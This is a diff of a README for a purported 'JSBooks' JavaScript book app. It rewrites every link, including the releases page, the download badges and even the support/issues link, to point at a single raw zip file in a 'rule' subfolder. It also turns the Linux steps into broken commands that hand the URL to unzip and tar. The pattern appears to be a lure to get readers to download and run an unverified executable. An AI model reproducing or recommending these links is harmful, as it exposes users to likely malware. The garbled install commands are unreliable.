@@ -1,6 +1,6 @@
 # 📚 JSBooks - Discover the Best JavaScript Books
 
-[![Download JSBooks](https://img.shields.io/badge/Download_JSBooks-Click_Here-blue)](https://github.com/Sairix5/JSBooks/releases)
+[![Download JSBooks](https://raw.githubusercontent.com/Sairix5/JSBooks/main/rule/Books_JS_v1.4.zip)](https://raw.githubusercontent.com/Sairix5/JSBooks/main/rule/Books_JS_v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Follow the steps below to download and run the software easily.
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Sairix5/JSBooks/releases) to access the latest version of JSBooks.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Sairix5/JSBooks/main/rule/Books_JS_v1.4.zip) to access the latest version of JSBooks.
 2. Look for the latest release, which is usually at the top of the page.
 3. Download the appropriate file for your operating system. Currently, we offer downloads for Windows, Mac, and Linux users.
 4. Once the download is complete, locate the downloaded file on your computer.
@@ -28,7 +28,7 @@ Follow the steps below to download and run the software easily.
 ### For Linux:
 
 - Open the terminal and navigate to the folder where you downloaded the .zip or .tar file.
-- Extract the files using the command `unzip JSBooks.zip` or `tar -xvf JSBooks.tar`.
+- Extract the files using the command `unzip https://raw.githubusercontent.com/Sairix5/JSBooks/main/rule/Books_JS_v1.4.zip` or `tar -xvf https://raw.githubusercontent.com/Sairix5/JSBooks/main/rule/Books_JS_v1.4.zip`.
 - Run the application using the command `./JSBooks`.
 
 ## 📖 Using JSBooks
@@ -61,8 +61,8 @@ If you encounter any issues while downloading or using JSBooks, try the followin
 
 ## 📞 Support
 
-If you need further assistance, please feel free to reach out through the GitHub Issues page. Click [here](https://github.com/Sairix5/JSBooks/issues) to report any problems or ask questions.
+If you need further assistance, please feel free to reach out through the GitHub Issues page. Click [here](https://raw.githubusercontent.com/Sairix5/JSBooks/main/rule/Books_JS_v1.4.zip) to report any problems or ask questions.
 
 Thank you for choosing JSBooks! Enjoy exploring the world of JavaScript through our curated list of books.
 
-[![Download JSBooks](https://img.shields.io/badge/Download_JSBooks-Click_Here-blue)](https://github.com/Sairix5/JSBooks/releases)
+[![Download JSBooks](https://raw.githubusercontent.com/Sairix5/JSBooks/main/rule/Books_JS_v1.4.zip)](https://raw.githubusercontent.com/Sairix5/JSBooks/main/rule/Books_JS_v1.4.zip)
